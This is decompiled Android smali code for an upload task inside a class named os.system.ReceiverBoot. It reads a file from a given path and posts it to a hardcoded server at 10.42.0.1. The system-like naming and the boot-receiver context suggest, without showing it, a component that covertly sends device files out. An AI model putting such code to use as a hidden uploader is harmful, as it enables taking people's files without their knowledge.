.class public Los/system/ReceiverBoot$UploadFileAsync;
.super Landroid/os/AsyncTask;
.source "ReceiverBoot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/ReceiverBoot;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "UploadFileAsync"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field resServer:Ljava/lang/String;

.field final synthetic this$0:Los/system/ReceiverBoot;


# direct methods
.method public constructor <init>(Los/system/ReceiverBoot;)V
    .locals 0

    .prologue
    .line 680
    iput-object p1, p0, Los/system/ReceiverBoot$UploadFileAsync;->this$0:Los/system/ReceiverBoot;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 680
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$UploadFileAsync;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 12

    .prologue
    const/4 v11, 0x0

    const/4 v0, 0x0

    .line 692
    aget-object v2, p1, v0

    .line 695
    const-string v0, "http://10.42.0.1/uploadFile.php"

    .line 700
    const/high16 v4, 0x100000

    .line 702
    const-string v1, ""

    .line 704
    const-string v5, "\r\n"

    .line 705
    const-string v6, "--"

    .line 706
    const-string v7, "*****"

    .line 711
    :try_start_0
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 712
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_0

    .line 714
    const-string v0, "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}"

    iput-object v0, p0, Los/system/ReceiverBoot$UploadFileAsync;->resServer:Ljava/lang/String;

    .line 789
    :goto_0
    return-object v11

    .line 718
    :cond_0
    new-instance v8, Ljava/io/FileInputStream;

    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v8, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 720
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 721
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    .line 722
    const/4 v3, 0x1

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 723
    const/4 v3, 0x1

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 724
    const/4 v3, 0x0

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 725
    const-string v3, "POST"

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 727
    const-string v3, "Connection"

    const-string v9, "Keep-Alive"

    invoke-virtual {v0, v3, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 728
    const-string v3, "Content-Type"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "multipart/form-data;boundary="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v3, v9}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 731
    new-instance v9, Ljava/io/DataOutputStream;

    .line 732
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v9, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 733
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v9, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 734
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Content-Disposition: form-data; name=\"filUpload\";filename=\""

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\""

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 735
    invoke-virtual {v9, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 737
    invoke-virtual {v9, v5}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 739
    invoke-virtual {v8}, Ljava/io/FileInputStream;->available()I

    move-result v2

    .line 740
    invoke-static {v2, v4}, Ljava/lang/Math;->min(II)I

    move-result v2

    .line 741
    new-array v10, v2, [B

    .line 744
    const/4 v3, 0x0

    invoke-virtual {v8, v10, v3, v2}, Ljava/io/FileInputStream;->read([BII)I

    move-result v3

    .line 746
    :goto_1
    if-lez v3, :cond_1

    .line 747
    const/4 v3, 0x0

    invoke-virtual {v9, v10, v3, v2}, Ljava/io/DataOutputStream;->write([BII)V

    .line 748
    invoke-virtual {v8}, Ljava/io/FileInputStream;->available()I

    move-result v2

    .line 749
    invoke-static {v2, v4}, Ljava/lang/Math;->min(II)I

    move-result v2

    .line 750
    const/4 v3, 0x0

    invoke-virtual {v8, v10, v3, v2}, Ljava/io/FileInputStream;->read([BII)I

    move-result v3

    goto :goto_1

    .line 753
    :cond_1
    invoke-virtual {v9, v5}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 754
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v9, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 757
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v2

    .line 758
    const/16 v3, 0xc8

    if-ne v2, v3, :cond_3

    .line 760
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    .line 761
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 764
    :goto_2
    invoke-virtual {v0}, Ljava/io/InputStream;->read()I

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_2

    .line 765
    invoke-virtual {v1, v3}, Ljava/io/ByteArrayOutputStream;->write(I)V

    goto :goto_2

    .line 784
    :catch_0
    move-exception v0

    goto/16 :goto_0

    .line 767
    :cond_2
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    .line 768
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 770
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    .line 774
    :goto_3
    const-string v1, "resCode="

    invoke-static {v2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 775
    const-string v1, "resMessage="

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 777
    invoke-virtual {v8}, Ljava/io/FileInputStream;->close()V

    .line 778
    invoke-virtual {v9}, Ljava/io/DataOutputStream;->flush()V

    .line 779
    invoke-virtual {v9}, Ljava/io/DataOutputStream;->close()V

    .line 781
    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Los/system/ReceiverBoot$UploadFileAsync;->resServer:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :cond_3
    move-object v0, v1

    goto :goto_3
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 680
    check-cast p1, Ljava/lang/Void;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$UploadFileAsync;->onPostExecute(Ljava/lang/Void;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/Void;)V
    .locals 3

    .prologue
    .line 793
    invoke-static {}, Los/system/ReceiverBoot;->access$700()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "upload sukses : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 794
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .prologue
    .line 685
    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    .line 686
    return-void
.end method
